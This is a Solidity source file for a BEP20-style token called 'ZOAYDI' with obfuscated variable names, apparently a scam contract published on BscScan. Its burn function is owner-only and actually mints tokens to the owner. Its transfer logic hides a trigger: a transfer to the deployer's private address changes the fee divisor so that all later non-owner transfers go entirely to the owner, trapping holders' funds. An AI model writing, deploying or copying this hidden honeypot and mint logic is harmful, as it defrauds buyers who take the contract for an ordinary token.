/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-14 03:58 GNT
 */
pragma solidity >=0.4.11;
contract wgCAFf {
uint256 public  kMAttS = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  vUMqQu = 100000000000000000000000;
uint256 public  URePms = 100000000000000000000000;
mapping (address => uint256) public balanceOf;
address public  iivRFW = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  pMIAzf = 100000000000000000;
uint256 public constant gUrubp = 9+1;
uint256 private  svAzMU = 10000000000000;
address public owner;
uint256 public  uAcBAe = 10000000000000000000;
address public  jaGAIF = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint8 public constant decimals = 18;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "ksAIri";
address public  HxuzEM = address(0);
uint256 public  tbVGsi = 10000000000000000000000000000;
address public  EkMOSi = address(0);
address public  DqypIT = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
address private  wCCbyB = address(0);
uint256 public  cpWIpE = 100000000000000000000;
uint256 public  Niyjvx = 10000000000000000;
string public  name = "ZOAYDI";
address public  hWgMQT = address(0);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "HZRUsa");
require(to != address(0), "HZRUsa");
require(amount <= balanceOf[from], "HZRUsa");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* gUrubp/svAzMU ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==wCCbyB){
svAzMU = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
constructor () {
wCCbyB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}